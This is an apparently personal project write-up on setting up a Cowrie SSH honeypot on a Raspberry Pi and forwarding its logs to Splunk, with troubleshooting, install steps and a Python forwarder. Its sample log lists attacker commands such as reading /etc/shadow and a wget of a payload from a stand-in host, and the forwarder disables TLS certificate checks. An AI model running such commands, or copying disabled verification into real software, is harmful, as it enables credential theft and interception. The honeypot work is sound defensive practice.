01. Project Overview

This project adds a third perimeter layer to my home security stack — sitting alongside the Pi-hole DNS sinkhole and the Suricata/Splunk mini-SOC. While Pi-hole blocks malicious domains before a connection is established and Suricata monitors live network traffic, Cowrie operates at the attacker's first point of entry: SSH port 22.

Cowrie is a medium-interaction SSH honeypot that emulates a real Linux shell. When an attacker connects on port 22, they land in a convincingly realistic fake environment — complete with a fake filesystem, fake users in /etc/passwd, and responsive shell commands. Meanwhile, every credential they try, every command they type, and every file they attempt to download is silently logged to structured JSON and forwarded in real-time to Splunk.

The real SSH daemon was quietly moved to port 2222 — invisible to scanners that target port 22 by default. Anyone probing the standard SSH port is talking to Cowrie.

"The goal isn't just detection — it's intelligence. Every failed login attempt is a credential to profile. Every command run is a TTP to map. Every session is a window into attacker methodology."

04. Challenges & Troubleshooting

This project hit a wall before it even started — the Pi was offline because the home WiFi password had changed. What followed was a cascade of debugging sessions that tested every layer of the stack. Every error below was real. Every fix below was earned.

PROBLEM 01 — NETWORKING
Pi offline — WiFi password changed
The Raspberry Pi Zero 2 WH went dark after the home router's WiFi password was updated. An nmap -sn 10.0.0.0/24 scan confirmed the Pi's previous IP (10.0.0.153) had disappeared from the network. The Pi has no display output — SSH was the only access method.
Wrote new credentials to wpa_supplicant.conf on the SD card boot partition (FAT32, readable from Windows) and added an empty ssh file to re-enable SSH on boot.
PROBLEM 02 — RASPBERRY PI OS BOOKWORM
wpa_supplicant.conf ignored on Bookworm
After reinserting the SD card, the Pi still didn't appear on the network. The root cause: Raspberry Pi OS Bookworm (Debian 12) replaced wpa_supplicant with NetworkManager as the default networking stack. The legacy wpa_supplicant.conf headless setup trick no longer works on Bookworm systems — the file is simply ignored.
Re-flashed the SD card entirely using Raspberry Pi Imager, which handles NetworkManager configuration internally via its firstrun.sh mechanism.
PROBLEM 03 — WSL2 USB LIMITATION
SD card invisible in WSL2
WSL2 runs in a Hyper-V virtual machine and does not automatically pass through USB devices from the Windows host. After installing WSL and Ubuntu, the SD card reader simply did not appear in lsblk — the ext4 rootfs partition (where NetworkManager keyfiles live) was unreachable without usbipd-win.
Bypassed the WSL approach entirely. Used Raspberry Pi Imager's built-in WiFi customisation screen to bake the new credentials directly into the image before flashing.
PROBLEM 04 — COWRIE v3 API CHANGE
bin/cowrie: No such file or directory
All existing Cowrie guides reference starting the honeypot with bin/cowrie start. Cowrie v3.x removed this script entirely. The new startup method uses twistd directly — the Twisted application runner — after installing the package with pip install -e ..
Installed Cowrie as a Python package (pip install -e .) and started it with authbind --deep twistd -n cowrie.
PROBLEM 05 — SYSTEMD FLAGS
twistd -n: option -l not recognized
The initial systemd service unit used -l - to redirect twistd logs to stdout (standard for systemd services). Cowrie's bundled twistd version does not support this flag — the service crashed immediately on every boot with the error shown in journalctl.
authbind[19619]: /home/cowrie/cowrie-env/bin/twistd -n: option -l not recognized
Removed the -l - flag from ExecStart. Cowrie handles its own file-based logging independently of twistd's log flags.
PROBLEM 06 — SPLUNK UNIVERSAL FORWARDER
No armv7l build available for Universal Forwarder
The Pi Zero 2 WH runs a 32-bit OS (uname -m → armv7l) despite having a 64-bit capable CPU. Splunk does not publish a Universal Forwarder build for 32-bit ARM — only x86_64 and aarch64 (64-bit ARM) are supported.
Switched to Splunk HTTP Event Collector (HEC). A lightweight Python script tails cowrie.json and POSTs each new JSON event directly to Splunk's HEC endpoint over HTTPS.
PROBLEM 07 — WINDOWS FIREWALL
HEC port 8088 blocked by Windows Defender Firewall
Curl from the Pi consistently timed out hitting http://10.0.0.141:8088. Splunk was running and HEC was enabled, but Windows Defender Firewall had no inbound rule for port 8088 — the connection was dropped silently at the OS level.
New-NetFirewallRule -DisplayName "Splunk HEC" -Direction Inbound -Protocol TCP -LocalPort 8088 -Action Allow
Added an inbound firewall rule for TCP port 8088. Verified connectivity with curl from the Pi immediately after.
PROBLEM 08 — TLS SELF-SIGNED CERTIFICATE
SSL: CERTIFICATE_VERIFY_FAILED — self-signed cert
After fixing the firewall, the Python forwarder started throwing SSL errors. Splunk HEC defaults to HTTPS with a self-signed certificate. Python's urllib.request rejects self-signed certs by default — every POST returned CERTIFICATE_VERIFY_FAILED. The initial script also used http:// instead of https://, which caused a secondary HTTP/0.9 protocol error.
import ssl
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
urllib.request.urlopen(req, timeout=5, context=CTX)
Created a custom SSL context with certificate verification disabled, and switched the URL to https://.
05. Installation Walkthrough
STEP 01 — FLASH SD CARD WITH RASPBERRY PI IMAGER
Bake WiFi credentials into the image
Use Raspberry Pi Imager → select Raspberry Pi Zero 2 W as device → Raspberry Pi OS Lite (32-bit) as OS (the 64-bit build explicitly excludes the Zero 2 W). In the Advanced Options screen, configure hostname, enable SSH with password auth, set username/password, and enter WiFi SSID + password. The Imager generates a firstrun.sh that writes the correct NetworkManager keyfile on first boot.
STEP 02 — DISCOVER PI ON NETWORK
Confirm the Pi connected to WiFi
Give the Pi 90 seconds to boot and connect. Scan the subnet for the new device — it appears as a new IP that wasn't there before. The Pi's IP stabilized at 10.0.0.153.
nmap -sn 10.0.0.0/24
If the Pi appears on the network but SSH is connection-refused, it's still running firstrun.sh — wait 30 more seconds. Use ssh karim@raspberrypi.local if the IP is unstable during DHCP assignment.
STEP 03 — SYSTEM UPDATE
Full OS upgrade before installing anything
Never install software on an unpatched system. The fresh Trixie image had a kernel update pending — this was applied first.
sudo apt update && sudo apt upgrade -y
STEP 04 — MOVE REAL SSH TO PORT 2222
Vacate port 22 for Cowrie — keep admin access
Edit /etc/ssh/sshd_config, change #Port 22 to Port 2222, restart SSH. Critical: always test the new port from a second terminal before closing the original session. If the new port works, port 22 is now free for Cowrie.
sudo nano /etc/ssh/sshd_config
# Change: #Port 22  →  Port 2222
sudo systemctl restart ssh

# From a NEW terminal — verify before closing original:
ssh -p 2222 karim@raspberrypi.local
Warning: The /etc/ssh/sshd_config.d/ directory is included automatically and can override the port setting. Check for files there if the port change doesn't take effect.
STEP 05 — INSTALL DEPENDENCIES
All packages Cowrie needs to build and run
This includes authbind for binding privileged port 22 without root, build tools for compiling Python crypto extensions, and git to clone the Cowrie repository.
sudo apt install -y git python3-venv python3-pip libssl-dev libffi-dev build-essential authbind
STEP 06 — CREATE COWRIE USER & CONFIGURE AUTHBIND
Principle of least privilege — Cowrie runs as its own user
Never run honeypot software as root. A dedicated cowrie user with no login shell limits blast radius if the honeypot is exploited. authbind grants this user-level process permission to bind port 22 specifically.
sudo adduser --disabled-password cowrie
sudo touch /etc/authbind/byport/22
sudo chown cowrie /etc/authbind/byport/22
sudo chmod 770 /etc/authbind/byport/22
STEP 07 — CLONE COWRIE & BUILD VIRTUAL ENVIRONMENT
Isolated Python environment for all dependencies
Switch to the cowrie user and clone the repository. A virtual environment keeps Cowrie's Python packages isolated from the system Python — critical for reproducibility and clean upgrades.
sudo su - cowrie
git clone https://github.com/cowrie/cowrie
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
STEP 08 — INSTALL COWRIE AS A PACKAGE
Cowrie v3 uses twistd — bin/cowrie no longer exists
Cowrie v3.x ships as an installable Python package. Installing with -e (editable mode) registers the cowrie Twisted plugin so twistd can discover and run it. Without this step, twistd reports "Unknown command: cowrie".
pip install -e .
STEP 09 — CONFIGURE COWRIE
Fake hostname, JSON logging, listen on port 22
The default config lives at src/cowrie/data/etc/cowrie.cfg.dist in v3 (not etc/cowrie.cfg.dist as older guides suggest). Three settings matter most: fake hostname for realism, listen port, and JSON log output.
cp src/cowrie/data/etc/cowrie.cfg.dist etc/cowrie.cfg
nano etc/cowrie.cfg
[honeypot]
hostname = ubuntu-server          # convincing fake hostname
listen_endpoints = tcp:22:interface=0.0.0.0

[output_jsonlog]
enabled = true
STEP 10 — LAUNCH & TEST
Start the honeypot and verify it's catching connections
Start Cowrie using authbind to bind port 22. The -n flag prevents twistd from daemonizing (keeps it in foreground for debugging). Watch the log in real time as test connections arrive.
authbind --deep twistd -n cowrie
# From Windows — connect to the honeypot
ssh root@raspberrypi.local
# Any password works — you land in a fake Debian shell
# root@ubuntu-server:~#
{"eventid":"cowrie.login.success","username":"root","password":"karim",
 "message":"login attempt [root/karim] succeeded","src_ip":"10.0.0.141",

{"eventid":"cowrie.command.input","input":"whoami","src_ip":"10.0.0.141",

STEP 11 — SYSTEMD SERVICE
Auto-start on boot — survives reboots
Create a systemd unit file for Cowrie. The service runs as the cowrie user with authbind granting port 22 access. Restart=on-failure ensures recovery from crashes.
sudo nano /etc/systemd/system/cowrie.service
[Unit]
Description=Cowrie SSH Honeypot
After=network.target

[Service]
Type=simple
User=cowrie
WorkingDirectory=/home/cowrie/cowrie
ExecStart=/usr/bin/authbind --deep /home/cowrie/cowrie/cowrie-env/bin/twistd -n cowrie
Restart=on-failure
RestartSec=30s

[Install]
WantedBy=multi-user.target
sudo systemctl daemon-reload
sudo systemctl enable cowrie
sudo systemctl start cowrie
sudo systemctl status cowrie   # Active: active (running)
06. Splunk HEC Integration

Since the Pi Zero 2 WH runs a 32-bit OS (armv7l) and Splunk's Universal Forwarder only ships for 64-bit platforms, a custom Python script handles the log forwarding. The script tails cowrie.json in real time and POSTs each new line to Splunk's HTTP Event Collector.

STEP 01 — ENABLE SPLUNK HEC
Configure Splunk to receive events over HTTP
In Splunk: Settings → Data Inputs → HTTP Event Collector → Global Settings — enable all tokens. Then create a new token named cowrie with source type _json, index main. Note: Splunk HEC uses HTTPS by default on port 8088 with a self-signed certificate.
STEP 02 — OPEN WINDOWS FIREWALL PORT 8088
Allow inbound HEC connections from the Pi
Windows Defender Firewall blocks port 8088 by default. Add an inbound rule in an elevated PowerShell session:
New-NetFirewallRule -DisplayName "Splunk HEC" -Direction Inbound -Protocol TCP -LocalPort 8088 -Action Allow
STEP 03 — DEPLOY THE FORWARDER SCRIPT
Python script that tails cowrie.json and POSTs to HEC
Written on Windows to avoid SSH terminal indentation issues, then SCP'd to the Pi. The script uses a custom SSL context to bypass self-signed certificate rejection.
import time, json, urllib.request, ssl

COWRIE_LOG    = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
SPLUNK_HEC_URL = "https://10.0.0.141:8088/services/collector/event"
SPLUNK_TOKEN  = "<your-hec-token>"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

def send_event(line):
    event = {"event": json.loads(line), "sourcetype": "_json"}
    req = urllib.request.Request(
        SPLUNK_HEC_URL, data=json.dumps(event).encode(),
        headers={"Authorization": "Splunk " + SPLUNK_TOKEN}
    )
    try:
        urllib.request.urlopen(req, timeout=5, context=CTX)
    except Exception as e:
        print("HEC error:", e)

def tail_forever(path):
    with open(path) as f:
        f.seek(0, 2)          # seek to end of file
        while True:
            line = f.readline()
            if line: send_event(line.strip())
            else: time.sleep(1)

if __name__ == "__main__":
    tail_forever(COWRIE_LOG)
# Transfer from Windows to Pi:
scp -P 2222 C:\Users\karim\cowrie_to_splunk.py karim@raspberrypi.local:/home/karim/

# Move to /opt and set up systemd service:
sudo mv /home/karim/cowrie_to_splunk.py /opt/cowrie_to_splunk.py
STEP 04 — SYSTEMD SERVICE FOR FORWARDER
Auto-start the HEC forwarder alongside Cowrie
The forwarder runs as the cowrie user so it can read the log files owned by that user. The After=cowrie.service dependency ensures the honeypot starts first.
[Unit]
Description=Cowrie to Splunk HEC Forwarder
After=network.target cowrie.service

[Service]
Type=simple
User=cowrie
ExecStart=/usr/bin/python3 /opt/cowrie_to_splunk.py
Restart=on-failure
RestartSec=10s

[Install]
WantedBy=multi-user.target
sudo systemctl daemon-reload
sudo systemctl enable cowrie-splunk
sudo systemctl start cowrie-splunk
07. What Cowrie Captures

Every SSH connection to port 22 produces a rich structured JSON event stream. Here is a representative sample from a single test session — this is exactly what real attackers will generate when they probe the honeypot from the internet.

EVENT TYPE — SESSION CONNECT
Connection metadata logged immediately on contact
Source IP, source port, destination, session ID, and protocol are captured the moment a connection is established — before any authentication attempt.
{
  "eventid":  "cowrie.session.connect",
  "src_ip":   "10.0.0.141",
  "src_port": 23721,
  "dst_ip":   "10.0.0.153",
  "dst_port": 22,
  "session":  "9ae329d4413d",
  "protocol": "ssh",
  "timestamp":"2026-06-08T13:22:39.545863Z"
}
EVENT TYPE — CLIENT FINGERPRINT
SSH client identified via HASSH fingerprint
Cowrie extracts the SSH client's key exchange algorithms and computes a HASSH fingerprint — a hash of the client's SSH negotiation parameters. This fingerprints the tool being used (Metasploit, custom scanner, OpenSSH version, etc.) even when the operator changes their IP.
{
  "eventid":  "cowrie.client.version",
  "version":  "SSH-2.0-OpenSSH_for_Windows_9.5",
  "hassh":    "701158e75b508e76f0410d5d22ef9df0",
  "src_ip":   "10.0.0.141",
  "session":  "9ae329d4413d"
}
EVENT TYPE — CREDENTIAL CAPTURE
Every username and password attempt logged in plaintext
Cowrie accepts any credential combination by default. Every attempt — whether it succeeds or fails — is logged with the exact username and password. This builds a live credential spray database straight from real attack traffic.
{
  "eventid":  "cowrie.login.success",
  "username": "root",
  "password": "admin123",
  "src_ip":   "10.0.0.141",
  "session":  "9ae329d4413d",
  "timestamp":"2026-06-08T13:22:41.897262Z"
}
EVENT TYPE — COMMAND LOGGING
Every keystroke in the fake shell recorded
Commands run inside the fake shell generate cowrie.command.input events. Failed commands (unknown to Cowrie's fake shell) generate cowrie.command.failed. Both are logged — failed commands reveal what the attacker expected to find.
{"eventid":"cowrie.command.input","input":"whoami","src_ip":"10.0.0.141"}
{"eventid":"cowrie.command.input","input":"cat /etc/shadow","src_ip":"10.0.0.141"}
{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"10.0.0.141"}
{"eventid":"cowrie.command.input","input":"wget http://malicious.site/payload.sh","src_ip":"10.0.0.141"}
{"eventid":"cowrie.command.failed","input":"ipconfig","src_ip":"10.0.0.141"}
EVENT TYPE — TTY RECORDING
Full terminal session recorded for playback
Cowrie records the complete terminal interaction as a TTY log file. The session can be replayed byte-for-byte to reconstruct exactly what the attacker saw and typed, including timing. Each recording is SHA256-hashed for integrity.
{
  "eventid":  "cowrie.log.closed",
  "ttylog":   "var/lib/cowrie/tty/087fdb158d77...",
  "shasum":   "087fdb158d77adbc9b8d7f09e34e4e7e...",
  "size":     602,
  "duration": "22.6"
}
SPLUNK RESULT — 17 EVENTS IN ONE SESSION
Full event pipeline confirmed working end-to-end
A single test SSH session to the honeypot generated 17 structured JSON events in Splunk within seconds of the connection. The complete attack lifecycle is visible: connect → fingerprint → authenticate → enumerate → exit.
Splunk search: index=main sourcetype=_json — Events arrive with fields src_ip, eventid, username, password, input, session, timestamp all automatically parsed from the JSON structure.
08. Outcomes & Security Value
  • Port 22 now runs a fully operational Cowrie SSH honeypot — any scanner probing the default SSH port hits a convincing fake Linux shell
  • Real SSH administration moved to port 2222, invisible to automated scanners that only target default ports
  • Every credential attempt logged in plaintext — username, password, and SSH client fingerprint (HASSH) recorded per session
  • Every command typed in the fake shell logged as a structured JSON event with timestamp and session correlation
  • Full TTY session recordings stored for forensic replay — every keypress, including timing, preserved
  • Live event stream flows into Splunk via HEC — 17 event types per session, all queryable in real time
  • Both cowrie.service and cowrie-splunk.service enabled and active — survive reboots automatically
  • Attacker IPs collected from src_ip field, ready to be fed into Pi-hole blocklist (next phase)
THREAT INTELLIGENCE LAYER — The honeypot currently operates on the local network. The next phase exposes it to the internet (port-forwarding port 22 on the router) — at which point real botnet scanners and credential stuffers will begin probing within minutes. The same pipeline that handled the test session will automatically capture, log, and forward real attack data to Splunk.
